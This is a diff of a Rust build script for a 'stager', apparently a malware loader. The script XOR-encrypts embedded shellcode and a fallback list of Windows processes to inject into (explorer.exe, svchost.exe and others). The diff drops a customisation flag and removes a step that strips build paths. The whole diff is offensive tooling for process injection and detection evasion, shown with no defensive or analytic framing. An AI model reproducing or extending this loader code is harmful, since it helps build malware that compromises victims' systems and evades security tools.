@@ -48,7 +48,7 @@ fn main() {
     // The names are NUL-separated so the stager can iterate without std.
     let inject_proc = env::var("INJECT_PROC").unwrap_or_default();
     let inject_proc = inject_proc.trim().to_string();
-    let (proc_chain, proc_custom) = if inject_proc.is_empty() {
+    let (proc_chain, _proc_custom) = if inject_proc.is_empty() {
         // Default fallback chain.
         (
             "explorer.exe\0RuntimeBroker.exe\0sihost.exe\0svchost.exe\0".to_string(),
@@ -76,22 +76,12 @@ fn main() {
              #[allow(dead_code)] const SC_KEY: u8 = {key}u8;\n\
              #[allow(dead_code)] const SC_ENC: &[u8] = &[{}];\n\
              #[allow(dead_code)] const PROC_KEY: u8 = {proc_key}u8;\n\
-             #[allow(dead_code)] const PROC_CUSTOM: bool = {proc_custom};\n\
              #[allow(dead_code)] const PROC_ENC: &[u8] = &[{}];\n",
             enc_bytes.join(", "),
             proc_enc_bytes.join(", "),
         ),
     )
     .unwrap();
-
-    // Strip build paths from panic messages.
-    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap_or_default();
-    if !manifest_dir.contains(' ') {
-        println!(
-            "cargo:rustc-flags=--remap-path-prefix={}=stager",
-            manifest_dir
-        );
-    }
 
     println!("cargo:rerun-if-env-changed=RG_TARGET");
     println!("cargo:rerun-if-env-changed=INJECT_PROC");
